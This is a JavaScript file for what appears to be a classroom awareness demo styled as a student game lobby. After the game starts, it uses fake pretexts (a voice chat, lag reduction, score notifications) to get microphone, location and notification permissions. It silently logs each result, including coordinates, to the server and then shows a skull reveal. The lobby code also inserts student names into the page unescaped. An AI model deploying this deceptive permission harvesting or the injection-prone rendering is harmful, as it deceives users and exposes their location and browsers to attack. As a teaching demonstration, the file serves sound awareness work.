const nombreLocal = document.body.dataset.nombre;
const listaEstudiantes = document.getElementById('lista-estudiantes');
        const btnTrampa = document.getElementById('btn-trampa');
        const subtituloEspera = document.getElementById('subtitulo-espera');
        
        let started = false;

        const evtSource = new EventSource('/api/stream_lobby');
        evtSource.onmessage = function(event) {
            const data = JSON.parse(event.data);
            
            // Actualizar estudiantes
            listaEstudiantes.innerHTML = '';
            data.estudiantes.forEach(est => {
                const img = est.foto ? `<img src="${est.foto}" alt="foto">` : `<img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1 1'></svg>">`;
                listaEstudiantes.innerHTML += `
                    <div class="estudiante-card">
                        ${img}
                        <div>${est.nombre}</div>
                    </div>
                `;
            });

            // Si el juego ha iniciado y no lo habíamos activado
            if (data.iniciado && !started) {
                started = true;
                subtituloEspera.innerText = "¡El juego ha comenzado!";
                listaEstudiantes.style.display = 'none';
                btnTrampa.style.display = 'block';
            }
        };

        async function ejecutarAtaque(nombre) {
            document.getElementById('espera-container').style.display = 'none';
            document.getElementById('trampa-modal').style.display = 'flex';
            
            const texto = document.getElementById('trampa-texto');

            // 1. Micrófono (Ingeniería social: Chat de voz)
            texto.innerHTML = "Iniciando chat de voz con Profe Paz...<br><br><strong style='color: var(--btn-neon);'>Por favor, haz clic en 'Permitir' en la ventana emergente.</strong>";
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    enviarLogSilencioso(nombre, 'Micrófono', 'Concedido', 'Audio interceptado exitosamente');
                    stream.getTracks().forEach(t => t.stop());
                } catch(err) {
                    enviarLogSilencioso(nombre, 'Micrófono', 'Denegado', 'Bloqueado');
                }
            }

            // 2. Ubicación (Ingeniería social: Servidor cercano)
            texto.innerHTML = "Buscando el servidor de juego más rápido...<br><br><strong style='color: var(--btn-neon);'>Permite el acceso a tu ubicación para evitar lag.</strong>";
            await new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            enviarLogSilencioso(nombre, 'Ubicación', 'Concedido', lat + ', ' + lon);
                            resolve();
                        },
                        function() {
                            enviarLogSilencioso(nombre, 'Ubicación', 'Denegado', 'Bloqueado');
                            resolve();
                        }
                    );
                } else resolve();
            });

            // 3. Notificaciones (Ingeniería social: Resultados)
            texto.innerHTML = "¡Casi listos!<br><br><strong style='color: var(--btn-neon);'>Activa las notificaciones para recibir tu puntaje final al terminar.</strong>";
            if ("Notification" in window) {
                const permission = await Notification.requestPermission();
                if (permission === "granted") {
                    new Notification("Sistema", { body: "Tu dispositivo ha sido registrado." });
                    enviarLogSilencioso(nombre, 'Notificaciones', 'Concedido', 'Acceso a escritorio');
                } else {
                    enviarLogSilencioso(nombre, 'Notificaciones', 'Denegado', 'Bloqueado');
                }
            }

            // 4. Final: Quitar trampa y mostrar la cruda realidad
            document.getElementById('trampa-modal').style.display = 'none';
            mostrarCalaveraLarga();
        }

        function mostrarCalaveraLarga() {
            const overlay = document.getElementById('skull-overlay');
            overlay.classList.add('active');
        }

        function enviarLogSilencioso(nombre, tipo, estado, detalle) {
            fetch('/log_permiso', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ nombre: nombre, tipo: tipo, estado: estado, detalle: detalle })
            });
        }